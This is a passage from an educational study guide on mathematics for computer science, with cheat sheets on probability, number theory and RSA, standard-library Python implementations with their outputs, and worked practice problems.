* **Newton's Method:** $\theta_{t+1} = \theta_t - [H(\theta_t)]^{-1} \nabla L(\theta_t)$ *(1D root-finding: $x_{t+1} = x_t - \frac{g(x_t)}{g'(x_t)}$)*.

---

## Cheat Sheet 04: Probability Theory & Statistics for CS

[🔙 Back to Top](#-master-table-of-contents)

### 4.1 Bayes' Theorem & Linearity of Expectation
* **Bayes' Theorem:**
  $$P(H \mid E) = \frac{P(E \mid H) P(H)}{P(E)} = \frac{P(E \mid H) P(H)}{P(E \mid H)P(H) + P(E \mid \neg H)P(\neg H)}$$
* **Linearity of Expectation (holds even for dependent variables!):**
  $$E\left[\sum_{i=1}^n c_i X_i\right] = \sum_{i=1}^n c_i E[X_i]$$
* **Indicator Random Variable Trick:** If $I_A \in \{0, 1\}$ indicates event $A$, then $E[I_A] = P(A)$.
* **Variance:** $\text{Var}(X) = E[X^2] - (E[X])^2$, and $\text{Var}(aX + b) = a^2 \text{Var}(X)$.

### 4.2 Essential Probability Distributions in CS

| Distribution | PMF / PDF | Mean $E[X]$ | Variance $\text{Var}(X)$ | Classic CS Application |
| :--- | :--- | :---: | :---: | :--- |
| **Bernoulli($p$)** | $p^x (1-p)^{1-x}$ | $p$ | $p(1-p)$ | Single coin flip, bit flip, packet drop |
| **Binomial($n, p$)** | $\binom{n}{k} p^k (1-p)^{n-k}$ | $np$ | $np(1-p)$ | Number of successes in $n$ independent trials |
| **Geometric($p$)** | $(1-p)^{k-1} p$ | $\frac{1}{p}$ | $\frac{1-p}{p^2}$ | Trials until first hash collision / pivot hit |
| **Poisson($\lambda$)** | $\frac{\lambda^k e^{-\lambda}}{k!}$ | $\lambda$ | $\lambda$ | Server request arrivals per second |
| **Uniform($a, b$)** | $\frac{1}{b-a}$ on $[a,b]$ | $\frac{a+b}{2}$ | $\frac{(b-a)^2}{12}$ | Pseudo-random number generators |
| **Exponential($\lambda$)** | $\lambda e^{-\lambda x}$ ($x \ge 0$) | $\frac{1}{\lambda}$ | $\frac{1}{\lambda^2}$ | Inter-arrival time between network packets |
| **Normal $\mathcal{N}(\mu, \sigma^2)$** | $\frac{1}{\sigma\sqrt{2\pi}} e^{-\frac{(x-\mu)^2}{2\sigma^2}}$ | $\mu$ | $\sigma^2$ | Gaussian noise, CLT averages, neural net init |

### 4.3 Concentration Inequalities
* **Markov:** $P(X \ge a) \le \frac{E[X]}{a}$ (for $X \ge 0, a > 0$)
* **Chebyshev:** $P(|X - E[X]| \ge k\sigma) \le \frac{1}{k^2}$
* **Chernoff:** $P(|X - \mu| \ge \delta \mu) \le 2 e^{-\mu \delta^2 / 3}$ for sum of independent Bernoulli trials with $\mu = E[X]$.

---

## Cheat Sheet 05: Number Theory, Abstract Algebra & Cryptography

[🔙 Back to Top](#-master-table-of-contents)

### 5.1 Divisibility, GCD & Modular Arithmetic
* **Euclidean Algorithm:** $\gcd(a, b) = \gcd(b, a \bmod b)$ in $O(\log(\min(a,b)))$ steps.
* **Bézout's Identity (Extended GCD):** There exist integers $x, y$ such that $ax + by = \gcd(a, b)$.
* **Modular Inverse:** $a^{-1} \bmod m$ exists $\iff \gcd(a, m) = 1$.
* **Fermat's Little Theorem:** If $p$ is prime and $p \nmid a$, then $a^{p-1} \equiv 1 \pmod p$.
* **Euler's Theorem:** If $\gcd(a, n) = 1$, then $a^{\phi(n)} \equiv 1 \pmod n$, where $\phi(n) = n \prod_{p \mid n} (1 - 1/p)$.
* **Chinese Remainder Theorem (CRT):** For pairwise coprime $m_1, \dots, m_k$ with $M = \prod m_i$, $x \equiv a_i \pmod{m_i}$ has unique solution $x = \left(\sum_{i=1}^k a_i M_i (M_i^{-1} \bmod m_i)\right) \bmod M$ where $M_i = M / m_i$.

### 5.2 RSA Public-Key Cryptosystem
1. **KeyGen:** Choose primes $p, q$; compute $n = pq$ and $\phi(n) = (p-1)(q-1)$; choose $e$ coprime to $\phi(n)$; compute $d \equiv e^{-1} \pmod{\phi(n)}$.
2. **Encrypt:** $c = m^e \bmod n$.
3. **Decrypt:** $m = c^d \bmod n$.

### 5.3 Abstract Algebra Hierarchy
* **Monoid $(S, \cdot)$:** Closure + Associativity + Identity element.
* **Group $(G, \cdot)$:** Monoid + Inverse for every element.
* **Abelian Group $(G, +)$:** Group + Commutativity.
* **Ring $(R, +, \times)$:** Abelian group under $+$, Monoid under $\times$, Distributive.
* **Field $(\mathbb{F}, +, \times)$:** Commutative Ring + Multiplicative inverse for every non-zero element (e.g., $\mathbb{R}, \mathbb{Z}_p, GF(2^8)$).

---

## Cheat Sheet 06: LaTeX Math Symbols & Notation Lookup

[🔙 Back to Top](#-master-table-of-contents)

| Symbol | Meaning | LaTeX Command | Symbol | Meaning | LaTeX Command |
| :---: | :--- | :--- | :---: | :--- | :--- |
| $\forall$ | For all | `\forall` | $\lfloor x \rfloor, \lceil x \rceil$ | Floor / Ceiling | `\lfloor x \rfloor`, `\lceil x \rceil` |
| $\exists, \nexists$ | Exists / Does not exist | `\exists`, `\nexists` | $\sum, \prod$ | Summation / Product | `\sum_{i=1}^n`, `\prod_{i=1}^n` |
| $\neg, \land, \lor, \oplus$ | NOT, AND, OR, XOR | `\neg`, `\land`, `\lor`, `\oplus` | $\binom{n}{k}$ | Binomial ($n$ choose $k$) | `\binom{n}{k}` |
| $\implies, \iff$ | Implies / If and only if | `\implies`, `\iff` | $O, \Omega, \Theta$ | Asymptotic bounds | `O(n)`, `\Omega(n)`, `\Theta(n)` |
| $\in, \notin, \subseteq$ | Element / Not in / Subset | `\in`, `\notin`, `\subseteq` | $a \equiv b \pmod m$ | Modular congruence | `a \equiv b \pmod m` |
| $\cup, \cap, \setminus$ | Union / Intersection / Diff | `\cup`, `\cap`, `\setminus` | $\nabla f, \frac{\partial f}{\partial x}$ | Gradient / Partial deriv | `\nabla f`, `\frac{\partial f}{\partial x}` |
| $\mathbb{N}, \mathbb{Z}, \mathbb{Q}, \mathbb{R}$ | Number sets | `\mathbb{N}`, `\mathbb{Z}`, `\mathbb{Q}`, `\mathbb{R}` | $\mathbb{E}[X], \text{Var}(X)$ | Expectation / Variance | `\mathbb{E}[X]`, `\text{Var}(X)` |

---

# Part III: Complete Python Implementations & Verified Outputs

All 5 modules below use **pure Python 3 standard library** (zero external dependencies) so you can copy, run, and study every mathematical algorithm directly.

---

## Module 01: Discrete Math, Combinatorics & Graph Algorithms

[🔙 Back to Top](#-master-table-of-contents)

```python
#!/usr/bin/env python3
"""
01_discrete_math_and_graphs.py
==============================
Hands-on Discrete Mathematics & Graph Theory for CS Students:
  1. Propositional Logic & Truth Table Generator (De Morgan's Law verification)
  2. Set Theory & Power Set construction
  3. Combinatorics (Binomial coefficients & Birthday Paradox / Pigeonhole Principle)
  4. Graph Theory: Dijkstra's Shortest Path & Topological Sort (Kahn's Algorithm)
"""

import heapq
import itertools
from collections import deque
from typing import Dict, List, Tuple


def verify_de_morgans_law() -> None:
    print("=== 1. Propositional Logic: Truth Table & De Morgan's Law ===")
    print(f"{'P':<6} {'Q':<6} {'not(P and Q)':<15} {'(not P) or (not Q)':<20} {'Equivalent?'}")
    print("-" * 62)
    for p, q in itertools.product([False, True], repeat=2):
        lhs = not (p and q)
        rhs = (not p) or (not q)
        print(f"{str(p):<6} {str(q):<6} {str(lhs):<15} {str(rhs):<20} {lhs == rhs}")
    print()


def power_set(s: List[str]) -> List[List[str]]:
    """Generates the power set P(S) of a set S using bitmasks (size 2^|S|)."""
    n = len(s)
    return [[s[i] for i in range(n) if (mask & (1 << i))] for mask in range(1 << n)]


def birthday_collision_probability(num_people: int, days: int = 365) -> float:
    """Computes exact probability that at least 2 people share a birthday."""
    prob_unique = 1.0
    for k in range(num_people):
        prob_unique *= (days - k) / days
    return 1.0 - prob_unique


def dijkstra_shortest_path(
    graph: Dict[str, List[Tuple[str, int]]], start: str
) -> Dict[str, float]:
    """Computes shortest paths from `start` to all vertices in a weighted graph."""
    distances: Dict[str, float] = {node: float("inf") for node in graph}
    distances[start] = 0.0
    pq: List[Tuple[float, str]] = [(0.0, start)]

    while pq:
        curr_dist, u = heapq.heappop(pq)
        if curr_dist > distances[u]:
            continue
        for v, weight in graph[u]:
            new_dist = curr_dist + weight
            if new_dist < distances[v]:
                distances[v] = new_dist
                heapq.heappush(pq, (new_dist, v))
    return distances


def topological_sort_dag(dag: Dict[str, List[str]]) -> List[str]:
    """Kahn's Algorithm for ordering a Directed Acyclic Graph (e.g., course prerequisites)."""
    in_degree: Dict[str, int] = {u: 0 for u in dag}
    for u in dag:
        for v in dag[u]:
            in_degree[v] = in_degree.get(v, 0) + 1

    queue = deque([u for u, deg in in_degree.items() if deg == 0])
    order: List[str] = []

    while queue:
        u = queue.popleft()
        order.append(u)
        for v in dag[u]:
            in_degree[v] -= 1
            if in_degree[v] == 0:
                queue.append(v)

    if len(order) != len(in_degree):
        raise ValueError("Graph contains a cycle — not a valid partial order (DAG)!")
    return order


if __name__ == "__main__":
    verify_de_morgans_law()

    print("=== 2. Set Theory: Power Set via Bitmasks ===")
    elements = ["A", "B", "C"]
    ps = power_set(elements)
    print(f"Set S = {elements} (|S| = {len(elements)})")
    print(f"|P(S)| = 2^{len(elements)} = {len(ps)} subsets: {ps}\n")

    print("=== 3. Combinatorics: Hash Collisions & Birthday Paradox ===")
    for n in [10, 23, 50, 70]:
        prob = birthday_collision_probability(n)
        print(f"  {n:>2} items in 365 buckets -> Collision probability: {prob * 100:6.2f}%")
    print()

    print("=== 4. Graph Theory: Dijkstra's Shortest Path & DAG Topological Sort ===")
    network = {
        "RouterA": [("RouterB", 4), ("RouterC", 2)],
        "RouterB": [("RouterC", 1), ("RouterD", 5)],
        "RouterC": [("RouterB", 1), ("RouterD", 8), ("RouterE", 10)],
        "RouterD": [("RouterE", 2)],
        "RouterE": [],
    }
    print("Shortest paths from RouterA:", dijkstra_shortest_path(network, "RouterA"))

    cs_prereqs = {
        "Discrete Math": ["Algorithms", "Cryptography"],
        "Linear Algebra": ["Machine Learning", "Computer Graphics"],
        "Calculus": ["Machine Learning"],
        "Probability": ["Machine Learning", "Algorithms"],
        "Algorithms": [],
        "Cryptography": [],
        "Machine Learning": [],
        "Computer Graphics": [],
    }
    print("Valid CS Course Study Order:", " -> ".join(topological_sort_dag(cs_prereqs)))
```

**Verified Output:**
```text
=== 1. Propositional Logic: Truth Table & De Morgan's Law ===
P      Q      not(P and Q)    (not P) or (not Q)   Equivalent?
--------------------------------------------------------------
False  False  True            True                 True
False  True   True            True                 True
True   False  True            True                 True
True   True   False           False                True

=== 2. Set Theory: Power Set via Bitmasks ===
Set S = ['A', 'B', 'C'] (|S| = 3)
|P(S)| = 2^3 = 8 subsets: [[], ['A'], ['B'], ['A', 'B'], ['C'], ['A', 'C'], ['B', 'C'], ['A', 'B', 'C']]

=== 3. Combinatorics: Hash Collisions & Birthday Paradox ===
  10 items in 365 buckets -> Collision probability:  11.69%
  23 items in 365 buckets -> Collision probability:  50.73%
  50 items in 365 buckets -> Collision probability:  97.04%
  70 items in 365 buckets -> Collision probability:  99.92%

=== 4. Graph Theory: Dijkstra's Shortest Path & DAG Topological Sort ===
Shortest paths from RouterA: {'RouterA': 0.0, 'RouterB': 3.0, 'RouterC': 2.0, 'RouterD': 8.0, 'RouterE': 10.0}
Valid CS Course Study Order: Discrete Math -> Linear Algebra -> Calculus -> Probability -> Cryptography -> Computer Graphics -> Machine Learning -> Algorithms
```

---

## Module 02: Linear Algebra, Gaussian Elimination & PageRank

[🔙 Back to Top](#-master-table-of-contents)

```python
#!/usr/bin/env python3
"""
02_linear_algebra_from_scratch.py
=================================
Pure-Python Linear Algebra for Computer Science:
  1. Vector Dot Product, Euclidean (L2) Norm & Cosine Similarity
  2. Matrix Multiplication & Transpose
  3. Solving Linear Systems (Ax = b) via Gaussian Elimination with Partial Pivoting
  4. Dominant Eigenvector & Google's PageRank via Power Iteration
"""

import math
from typing import List

Vector = List[float]
Matrix = List[List[float]]


def dot(u: Vector, v: Vector) -> float:
    return sum(ui * vi for ui, vi in zip(u, v))


def l2_norm(u: Vector) -> float:
    return math.sqrt(dot(u, u))


def cosine_similarity(u: Vector, v: Vector) -> float:
    return dot(u, v) / (l2_norm(u) * l2_norm(v))


def matvec(A: Matrix, x: Vector) -> Vector:
    return [dot(row, x) for row in A]


def gaussian_elimination(A: Matrix, b: Vector) -> Vector:
    """Solves Ax = b using Gaussian Elimination with partial pivoting."""
    n = len(A)
    aug = [A[i][:] + [b[i]] for i in range(n)]

    for col in range(n):
        pivot_row = max(range(col, n), key=lambda r: abs(aug[r][col]))
        aug[col], aug[pivot_row] = aug[pivot_row], aug[col]

        if abs(aug[col][col]) < 1e-12:
            raise ValueError("Matrix is singular or nearly singular!")

        for row in range(col + 1, n):
            factor = aug[row][col] / aug[col][col]
            for k in range(col, n + 1):
                aug[row][k] -= factor * aug[col][k]

    x = [0.0] * n
    for i in range(n - 1, -1, -1):
        x[i] = (aug[i][n] - sum(aug[i][j] * x[j] for j in range(i + 1, n))) / aug[i][i]
    return x


def pagerank_power_iteration(
    adj_matrix: Matrix, damping: float = 0.85, iterations: int = 50
) -> Vector:
    """Computes PageRank scores via Power Iteration on the web link graph."""
    n = len(adj_matrix)
    M = [[0.0] * n for _ in range(n)]
    for j in range(n):
        out_degree = sum(adj_matrix[j])
        for i in range(n):
            M[i][j] = (adj_matrix[j][i] / out_degree) if out_degree > 0 else (1.0 / n)

    rank = [1.0 / n] * n
    teleport = (1.0 - damping) / n
    for _ in range(iterations):
        mv = matvec(M, rank)
        rank = [damping * val + teleport for val in mv]
    return rank


if __name__ == "__main__":
    print("=== 1. Vector Spaces & Cosine Similarity (NLP Embedding Demo) ===")
    doc_cs = [0.9, 0.8, 0.1, 0.0]
    doc_ai = [0.85, 0.9, 0.2, 0.05]
    doc_cooking = [0.05, 0.1, 0.95, 0.9]
    print(f"Cosine Similarity (CS vs AI):      {cosine_similarity(doc_cs, doc_ai):.4f}")
    print(f"Cosine Similarity (CS vs Cooking): {cosine_similarity(doc_cs, doc_cooking):.4f}\n")

    print("=== 2. Solving Linear System Ax = b via Gaussian Elimination ===")
    A = [[2.0, 1.0, -1.0], [-3.0, -1.0, 2.0], [-2.0, 1.0, 2.0]]
    b = [8.0, -11.0, -3.0]
    solution = gaussian_elimination(A, b)
    print(f"Solution x = {[round(val, 4) for val in solution]} (Expected: [2.0, 3.0, -1.0])\n")

    print("=== 3. Eigenvectors in Action: Google PageRank via Power Iteration ===")
    links = [
        [0, 1, 1, 0],
        [1, 0, 0, 0],
        [1, 1, 0, 1],
        [1, 0, 0, 0],
    ]
    for idx, score in enumerate(pagerank_power_iteration(links)):
        print(f"  Page {idx}: PageRank = {score:.4f}")
```

**Verified Output:**
```text
=== 1. Vector Spaces & Cosine Similarity (NLP Embedding Demo) ===
Cosine Similarity (CS vs AI):      0.9925
Cosine Similarity (CS vs Cooking): 0.1386

=== 2. Solving Linear System Ax = b via Gaussian Elimination ===
Solution x = [2.0, 3.0, -1.0] (Expected: [2.0, 3.0, -1.0])

=== 3. Eigenvectors in Action: Google PageRank via Power Iteration ===
  Page 0: PageRank = 0.4143
  Page 1: PageRank = 0.2741
  Page 2: PageRank = 0.2136
  Page 3: PageRank = 0.0980
```

---

## Module 03: Numerical Calculus, Newton-Raphson & Gradient Descent

[🔙 Back to Top](#-master-table-of-contents)

```python
#!/usr/bin/env python3
"""
03_calculus_and_gradient_descent.py
===================================
Calculus & Continuous Optimization for CS / Machine Learning:
  1. Numerical Differentiation: Forward Difference vs. Central Difference Error Analysis
  2. Root Finding: Newton-Raphson Method (computing sqrt(2) to machine precision)
  3. Multivariable Optimization: Gradient Descent on Linear Regression Loss
"""

import math
from typing import Callable, List, Tuple


def forward_difference(f: Callable[[float], float], x: float, h: float = 1e-5) -> float:
    return (f(x + h) - f(x)) / h


def central_difference(f: Callable[[float], float], x: float, h: float = 1e-5) -> float:
    return (f(x + h) - f(x - h)) / (2.0 * h)


def newton_raphson(
    f: Callable[[float], float],
    df: Callable[[float], float],
    x0: float,
    tol: float = 1e-12,
    max_iter: int = 20,
) -> Tuple[float, int]:
    x = x0
    for step in range(1, max_iter + 1):
        fx = f(x)
        if abs(fx) < tol:
            return x, step
        x = x - fx / df(x)
    return x, max_iter


def gradient_descent_linear_regression(
    xs: List[float], ys: List[float], lr: float = 0.05, epochs: int = 400
) -> Tuple[float, float, float]:
    w, b = 0.0, 0.0
    n = len(xs)
    for _ in range(epochs):
        grad_w = sum(2.0 * (w * x + b - y) * x for x, y in zip(xs, ys)) / n
        grad_b = sum(2.0 * (w * x + b - y) for x, y in zip(xs, ys)) / n
        w -= lr * grad_w
        b -= lr * grad_b

    mse = sum((w * x + b - y) ** 2 for x, y in zip(xs, ys)) / n
    return w, b, mse


if __name__ == "__main__":
    print("=== 1. Numerical Derivatives: Forward vs. Central Difference ===")
    x_val = math.pi / 4
    exact = math.cos(x_val)
    fwd = forward_difference(math.sin, x_val, h=1e-4)
    cnt = central_difference(math.sin, x_val, h=1e-4)
    print(f"Exact cos(pi/4):      {exact:.12f}")
    print(f"Forward Diff (h=1e-4): {fwd:.12f} (Error: {abs(fwd - exact):.2e})")
    print(f"Central Diff (h=1e-4): {cnt:.12f} (Error: {abs(cnt - exact):.2e})\n")

    print("=== 2. Newton-Raphson Root Finding: Solving x^2 - 2 = 0 ===")
    root, iters = newton_raphson(lambda x: x * x - 2.0, lambda x: 2.0 * x, x0=1.0)
    print(f"Computed sqrt(2) = {root:.15f} in {iters} iterations")
    print(f"math.sqrt(2)     = {math.sqrt(2):.15f}\n")

    print("=== 3. Multivariable Gradient Descent: Fitting y = 3.5x + 1.2 ===")
    xs = [0.0, 1.0, 2.0, 3.0, 4.0, 5.0]
    ys = [3.5 * x + 1.2 for x in xs]
    w_fit, b_fit, final_loss = gradient_descent_linear_regression(xs, ys)
    print(f"Learned parameters: w = {w_fit:.4f}, b = {b_fit:.4f} (Final MSE Loss: {final_loss:.2e})")
```

**Verified Output:**
```text
=== 1. Numerical Derivatives: Forward vs. Central Difference ===
Exact cos(pi/4):      0.707106781187
Forward Diff (h=1e-4): 0.707071424669 (Error: 3.54e-05)
Central Diff (h=1e-4): 0.707106780008 (Error: 1.18e-09)

=== 2. Newton-Raphson Root Finding: Solving x^2 - 2 = 0 ===
Computed sqrt(2) = 1.414213562373095 in 6 iterations
math.sqrt(2)     = 1.414213562373095

=== 3. Multivariable Gradient Descent: Fitting y = 3.5x + 1.2 ===
Learned parameters: w = 3.5000, b = 1.2000 (Final MSE Loss: 4.75e-13)
```

---

## Module 04: Bayesian Inference, Monte Carlo & Coupon Collector

[🔙 Back to Top](#-master-table-of-contents)

```python
#!/usr/bin/env python3
"""
04_probability_and_monte_carlo.py
=================================
Probability Theory, Bayesian Inference & Randomized Algorithms:
  1. Bayes' Theorem: Intrusion / Spam Filter Posterior Probability
  2. Monte Carlo Simulation: Estimating Pi via Random Sampling
  3. Linearity of Expectation: The Coupon Collector's Problem (Server Shard Coverage)
"""

import math
import random


def bayes_theorem(prior_h: float, prob_e_given_h: float, prob_e_given_not_h: float) -> float:
    prob_e = prob_e_given_h * prior_h + prob_e_given_not_h * (1.0 - prior_h)
    return (prob_e_given_h * prior_h) / prob_e


def monte_carlo_pi(num_samples: int = 100_000, seed: int = 42) -> float:
    rng = random.Random(seed)
    inside_circle = sum(
        1 for _ in range(num_samples) if rng.random() ** 2 + rng.random() ** 2 <= 1.0
    )
    return 4.0 * inside_circle / num_samples


def coupon_collector_theoretical(n: int) -> float:
    return n * sum(1.0 / i for i in range(1, n + 1))


def coupon_collector_simulation(n: int, trials: int = 2000, seed: int = 42) -> float:
    rng = random.Random(seed)
    total_steps = 0
    for _ in range(trials):
        seen = set()
        steps = 0
        while len(seen) < n:
            seen.add(rng.randrange(n))
            steps += 1
        total_steps += steps
    return total_steps / trials


if __name__ == "__main__":
    print("=== 1. Bayes' Theorem: Intrusion Detection Alert Accuracy ===")
    posterior = bayes_theorem(prior_h=0.01, prob_e_given_h=0.99, prob_e_given_not_h=0.02)
    print(
        f"Prior attack rate: 1.0% | Alert TPR: 99.0% | Alert FPR: 2.0%\n"
        f"-> Posterior probability an alert is a real attack: {posterior * 100:.2f}%\n"
    )

    print("=== 2. Monte Carlo Integration: Estimating Pi ===")
    est_pi = monte_carlo_pi(100_000)
    print(f"Monte Carlo Pi (100,000 samples): {est_pi:.5f} (Actual Pi: {math.pi:.5f})\n")

    print("=== 3. Coupon Collector Problem (Linearity of Expectation) ===")
    shards = 20
    print(f"Collecting all {shards} hash buckets:")
    print(f"  Exact Theoretical E[T] = n * H_n = {coupon_collector_theoretical(shards):.2f} requests")
    print(f"  Simulated Average (2000 trials)  = {coupon_collector_simulation(shards):.2f} requests")
```

**Verified Output:**
```text
=== 1. Bayes' Theorem: Intrusion Detection Alert Accuracy ===
Prior attack rate: 1.0% | Alert TPR: 99.0% | Alert FPR: 2.0%
-> Posterior probability an alert is a real attack: 33.33%

=== 2. Monte Carlo Integration: Estimating Pi ===
Monte Carlo Pi (100,000 samples): 3.13728 (Actual Pi: 3.14159)

=== 3. Coupon Collector Problem (Linearity of Expectation) ===
Collecting all 20 hash buckets:
  Exact Theoretical E[T] = n * H_n = 71.95 requests
  Simulated Average (2000 trials)  = 71.99 requests
```

---

## Module 05: Primes, Extended GCD & End-to-End RSA Cryptosystem

[🔙 Back to Top](#-master-table-of-contents)

```python
#!/usr/bin/env python3
"""
05_number_theory_and_crypto.py
==============================
Number Theory, Modular Arithmetic & Public-Key Cryptography:
  1. Sieve of Eratosthenes (Fast Prime Generation)
  2. Extended Euclidean Algorithm (Bézout's Identity: ax + by = gcd(a, b))
  3. Modular Multiplicative Inverse & Binary Modular Exponentiation
  4. Full Working RSA Key Generation, Encryption & Decryption from Scratch
"""

from typing import List, Tuple


def sieve_of_eratosthenes(limit: int) -> List[int]:
    is_prime = [True] * (limit + 1)
    is_prime[0] = is_prime[1] = False
    for p in range(2, int(limit**0.5) + 1):
        if is_prime[p]:
            for multiple in range(p * p, limit + 1, p):
                is_prime[multiple] = False
    return [i for i, prime in enumerate(is_prime) if prime]


def extended_gcd(a: int, b: int) -> Tuple[int, int, int]:
    if b == 0:
        return a, 1, 0
    g, x1, y1 = extended_gcd(b, a % b)
    return g, y1, x1 - (a // b) * y1


def mod_inverse(a: int, m: int) -> int:
    g, x, _ = extended_gcd(a, m)
    if g != 1:
        raise ValueError(f"Modular inverse does not exist since gcd({a}, {m}) = {g} != 1")
    return x % m


def mod_exp(base: int, exp: int, mod: int) -> int:
    result = 1
    base %= mod
    while exp > 0:
        if exp & 1:
            result = (result * base) % mod
        base = (base * base) % mod
        exp >>= 1
    return result


def rsa_demo() -> None:
    print("=== 3. End-to-End RSA Cryptosystem from Scratch ===")
    p, q = 1009, 2741
    n = p * q
    phi_n = (p - 1) * (q - 1)
    e = 65537
    d = mod_inverse(e, phi_n)

    message = 421337
    ciphertext = mod_exp(message, e, n)
    decrypted = mod_exp(ciphertext, d, n)

    print(f"  Primes: p = {p}, q = {q}")
    print(f"  Modulus n = p * q = {n}, Euler's Totient phi(n) = {phi_n}")
    print(f"  Public Key  (e, n) = ({e}, {n})")
    print(f"  Private Key (d, n) = ({d}, {n})")
    print(f"  Check (e * d) mod phi(n) = {(e * d) % phi_n}")
    print(f"  Original Message:   {message}")
    print(f"  Encrypted (m^e % n): {ciphertext}")
    print(f"  Decrypted (c^d % n): {decrypted} (Match: {message == decrypted})")


if __name__ == "__main__":
    print("=== 1. Sieve of Eratosthenes: Primes up to 50 ===")
    print(" ", sieve_of_eratosthenes(50), "\n")

    print("=== 2. Extended Euclidean Algorithm & Bézout's Identity ===")
    a, b = 240, 46
    g, x, y = extended_gcd(a, b)
    print(f"  gcd({a}, {b}) = {g}")
    print(f"  Bézout coefficients: {a}*({x}) + {b}*({y}) = {a * x + b * y}\n")

    rsa_demo()
```

**Verified Output:**
```text
=== 1. Sieve of Eratosthenes: Primes up to 50 ===
  [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47] 

=== 2. Extended Euclidean Algorithm & Bézout's Identity ===
  gcd(240, 46) = 2
  Bézout coefficients: 240*(-9) + 46*(47) = 2

=== 3. End-to-End RSA Cryptosystem from Scratch ===
  Primes: p = 1009, q = 2741
  Modulus n = p * q = 2765669, Euler's Totient phi(n) = 2761920
  Public Key  (e, n) = (65537, 2765669)
  Private Key (d, n) = (1215233, 2765669)
  Check (e * d) mod phi(n) = 1
  Original Message:   421337
  Encrypted (m^e % n): 1318217
  Decrypted (c^d % n): 421337 (Match: True)
```

---

# Part IV: Practice Problems & Step-by-Step Solutions

[🔙 Back to Top](#-master-table-of-contents)

### Problem 1 (Mathematical Induction & Loop Invariants)
Prove by induction that for all integers $n \ge 1$:
$$\sum_{i=1}^{n} i \cdot 2^{i-1} = (n - 1)2^n + 1$$

<details>
<summary><b>💡 Show Solution</b></summary>

* **Base Case ($n = 1$):** Left-hand side $= 1 \cdot 2^0 = 1$. Right-hand side $= (1 - 1)2^1 + 1 = 1$. Holds.
* **Inductive Hypothesis:** Suppose $\sum_{i=1}^{k} i \cdot 2^{i-1} = (k - 1)2^k + 1$ for an arbitrary integer $k \ge 1$.
* **Inductive Step:** For $n = k + 1$:
  $$\sum_{i=1}^{k+1} i \cdot 2^{i-1} = (k - 1)2^k + 1 + (k + 1)2^k = 2k \cdot 2^k + 1 = k \cdot 2^{k+1} + 1$$
  which equals $((k+1) - 1)2^{k+1} + 1$. By Mathematical Induction, the claim holds for all $n \ge 1$. $\blacksquare$
</details>

---

### Problem 2 (Master Theorem & Recurrences)
Solve the following recurrence relations for their asymptotic tight bound $\Theta(\cdot)$:
1. $T(n) = 4T(n/2) + n$
2. $T(n) = 2T(n/2) + n \log n$
3. $T(n) = 3T(n/4) + n^2$

<details>
<summary><b>💡 Show Solution</b></summary>

1. **$T(n) = 4T(n/2) + n$:** $a=4, b=2 \implies c_{\text{crit}} = \log_2 4 = 2$. Since $f(n) = n^1 = O(n^{2-\epsilon})$, Case 1 applies: **$T(n) = \Theta(n^2)$**.
2. **$T(n) = 2T(n/2) + n \log n$:** $a=2, b=2 \implies c_{\text{crit}} = \log_2 2 = 1$. Since $f(n) = \Theta(n^1 \log^1 n)$, Case 2 ($k=1$) applies: **$T(n) = \Theta(n \log^2 n)$**.
3. **$T(n) = 3T(n/4) + n^2$:** $a=3, b=4 \implies c_{\text{crit}} = \log_4 3 \approx 0.792$. Since $f(n) = n^2 = \Omega(n^{0.792 + \epsilon})$ and regularity holds, Case 3 applies: **$T(n) = \Theta(n^2)$**.
</details>

---

### Problem 3 (Graph Theory & Handshaking Lemma)
Can a simple undirected graph with $7$ vertices have each vertex of degree $3$? Why or why not?

<details>
<summary><b>💡 Show Solution</b></summary>

**No.** By the **Handshaking Lemma**, $\sum_{v \in V} \deg(v) = 2|E|$. If there were $7$ vertices each of degree $3$, the sum of degrees would be $7 \times 3 = 21$, which is odd and cannot equal $2|E|$.
</details>

---

### Problem 4 (Linear Algebra: Eigenvalues & Eigenvectors)
Find the eigenvalues and eigenvectors of $A = \begin{bmatrix} 4 & 1 \\ 2 & 3 \end{bmatrix}$.

<details>
<summary><b>💡 Show Solution</b></summary>

* **Characteristic polynomial:** $\det(A - \lambda I) = (4 - \lambda)(3 - \lambda) - 2 = \lambda^2 - 7\lambda + 10 = (\lambda - 5)(\lambda - 2) = 0$.
* **Eigenvalues:** $\lambda_1 = 5, \lambda_2 = 2$.
* **Eigenvectors:**
  * For $\lambda_1 = 5$: $(A - 5I)v = 0 \implies v_1 = [1, 1]^T$.
  * For $\lambda_2 = 2$: $(A - 2I)v = 0 \implies v_2 = [1, -2]^T$.
</details>

---

### Problem 5 (Probability: Hash Table Collisions via Linearity of Expectation)
Suppose $n$ keys are hashed uniformly and independently into a hash table with $m$ slots. What is the **expected number of collisions** (pairs of distinct keys $(i, j)$ with $i < j$ that land in the same slot)?

<details>
<summary><b>💡 Show Solution</b></summary>

For each pair $1 \le i < j \le n$, let $X_{ij} = 1$ if $h(i) = h(j)$ and $0$ otherwise. Then $E[X_{ij}] = P(h(i) = h(j)) = \frac{1}{m}$.
There are $\binom{n}{2} = \frac{n(n-1)}{2}$ pairs. By **Linearity of Expectation**:
$$E[\text{Collisions}] = \sum_{1 \le i < j \le n} E[X_{ij}] = \binom{n}{2}\frac{1}{m} = \frac{n(n-1)}{2m}$$
</details>

---

### Problem 6 (Number Theory: Modular Inverse via Extended GCD)
Find the multiplicative inverse of $17 \pmod{43}$.

<details>
<summary><b>💡 Show Solution</b></summary>

1. $43 = 2 \times 17 + 9$
2. $17 = 1 \times 9 + 8$
3. $9 = 1 \times 8 + 1$

Back-substituting:
$$1 = 9 - 8 = 9 - (17 - 9) = 2 \times 9 - 17 = 2(43 - 2 \times 17) - 17 = 2 \times 43 - 5 \times 17$$
Modulo $43$: $(-5) \times 17 \equiv 1 \pmod{43} \implies 17^{-1} \equiv -5 \equiv 38 \pmod{43}$.
</details>

---

# Part V: Additional Resources, Interactive Platforms & Study Guide

[🔙 Back to Top](#-master-table-of-contents)

### Interactive Visualizers & Problem Platforms
| Platform | Focus Area | Link |
| :--- | :--- | :--- |
| **Project Euler** | 800+ challenging mathematical/computer programming problems | [projecteuler.net](https://projecteuler.net/) |
| **CryptoHack** | Interactive Number Theory, Abstract Algebra & Cryptography puzzles | [cryptohack.org](https://cryptohack.org/) |
| **Seeing Theory** | Interactive visualizations for Probability & Statistics | [seeing-theory.brown.edu](https://seeing-theory.brown.edu/) |
| **Immersive Math** | Interactive Linear Algebra with manipulable 3D vectors & matrices | [immersivemath.com](https://immersivemath.com/) |
